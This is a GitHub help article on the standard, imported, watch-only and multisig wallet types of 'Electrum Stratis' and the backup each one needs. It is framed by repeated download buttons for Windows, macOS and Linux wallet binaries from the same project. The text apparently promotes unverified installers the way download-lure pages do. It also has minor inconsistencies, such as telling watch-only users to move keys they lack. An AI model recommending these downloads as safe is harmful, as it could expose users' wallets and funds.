![Electrum-Stratis](assets/banner-article.png)

# Standard, multisig and imported wallets: what the three types mean

<p align="center">Three wallet types and the backup each one needs</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis offers three wallet shapes, and choosing the wrong one is the usual reason a restore looks empty. A standard wallet is derived from a seed and holds everything; an imported wallet holds raw keys or addresses added by hand; a multisig wallet requires several keys to spend. Only the standard wallet is fully reconstructed by its seed. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Type | Backed up by | Restores from seed | Typical use |
|---|---|---|---|
| Standard | The seed | Fully | Everyday holding and staking |
| Imported keys | Each key, separately | No | Sweeping an old wallet or a paper key |
| Imported addresses | Nothing - watch only | No | Monitoring a balance you do not control |
| Multisig | Each participating seed | Partly, with the other keys | Shared custody |

</div>

The test is simple: if the wallet was created from a phrase, the phrase restores it. If anything in it arrived by import, that part needs its own backup.

## Why it happens

The three types exist because a wallet can know about coins in three different ways. A standard wallet derives keys from a seed, so the seed is a complete description. An imported key is a single secret dropped into the wallet, with no relationship to the seed above it. A watch-only entry is not a secret at all: the wallet can see the balance and cannot spend it.

Multisig sits apart: spending needs signatures from more than one key, so no single seed is sufficient by design. That is the feature, and it is also the backup problem - losing one participant's seed can lock the funds permanently.

The type is named before anything is asked for, in the actively maintained build - current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) - so no one has to guess which backup applies.

A multisig wallet is not one wallet with three backups; it is a policy shared by several cosigners, each holding an independent seed and an extended public key for the others. That is why the backup problem changes shape: any single seed can be lost without losing the coins, as long as enough cosigners remain, and no single person can move funds alone. A watch-only entry is different again - it carries public keys and no spending authority, so it can show a balance that no password on this machine can spend.

## Fix

1. **Create a standard wallet for anything you intend to keep.** It is the only type whose single backup is complete, and the backup wizard verifies that backup at creation.
2. **Use an imported key as a temporary state, not a home.** Import to see the balance, sweep to an address your seed controls, then remove the key. An imported key left in place is a second copy of a secret.
3. **Use watch-only when you want to look, not to hold.** It shows the balance and cannot move it, which makes it safe to keep on a machine you would not trust with keys.
4. **Use multisig only with people and backups you trust completely.** Write down which seeds are required, and test a spend before funding it properly.
5. **Label the wallet type on every backup.** A paper seed with no note is ambiguous years later; one line - standard, this chain, this date - removes the ambiguity.

If a restore shows fewer coins than expected, the first question is whether the missing coins came from an imported key. The second is whether the restore used the right derivation.

## If that did not work

If a standard wallet restores to the right addresses but an expected balance is missing, the missing part was almost certainly imported. Look for the key backup, or for the original wallet that generated it.

If a multisig wallet will not spend, the missing signature is the answer: the wallet needs the other participants, and no amount of restoring changes that. Losing one participant's seed in an m-of-n setup can make the funds unspendable, which is worth knowing before choosing it.

If a watch-only wallet shows a balance and refuses to send, that is correct behaviour rather than a fault. Move the keys to a standard wallet to spend, and if the two views disagree see [three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md).

## Prevention

- Default to standard wallets; they have one backup and one failure mode.
- Sweep imported keys promptly instead of leaving them resident.
- Never store a key inside a wallet on a machine you would not hand your seed to.
- Record the type and the participants of any multisig setup.
- Test every wallet type with a small amount before trusting it with a large one.
- Record which wallet type you created, because the backup it needs depends on that answer.

## FAQ

### What are the Electrum wallet types?

Standard (seed-derived), imported keys or addresses, watch-only, and multisig. The first is fully restored by its seed; the others carry material the seed does not describe, so each needs its own backup and, in the multisig case, the cooperation of the other key holders.

### Which type should I use for staking?

A standard wallet, because staking needs the private keys and the seed is then a complete backup. Watch-only cannot stake, and imported keys complicate the backup for no benefit.

### Do I need a multisig wallet?

Only if you are deliberately splitting custody between people or devices so that no single key can move funds. For a single holder, multisig adds a failure mode - a lost participant - without adding much beyond what a seed plus a passphrase already provide.

### Is a watch-only wallet safe?

It is the safest type to keep on a networked machine, because it holds no secrets and cannot spend. Its risk is the opposite of a normal wallet's: not theft, but the illusion of control - seeing a balance and assuming you can move it.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
